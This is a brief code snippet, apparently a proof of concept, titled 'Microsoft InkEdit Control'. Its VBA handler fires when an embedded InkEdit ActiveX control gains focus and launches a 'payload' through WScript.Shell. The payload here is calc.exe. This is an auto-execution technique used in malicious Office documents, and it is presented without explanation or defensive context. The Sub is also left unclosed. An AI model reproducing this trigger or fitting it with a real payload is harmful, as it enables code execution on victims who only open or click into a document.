## Microsoft InkEdit Control
```
Sub InkEdit1_GotFocus()
  Dim payload as String
  payload = "calc.exe"
  CreateObject("Wscript.Shell").Run payload
```
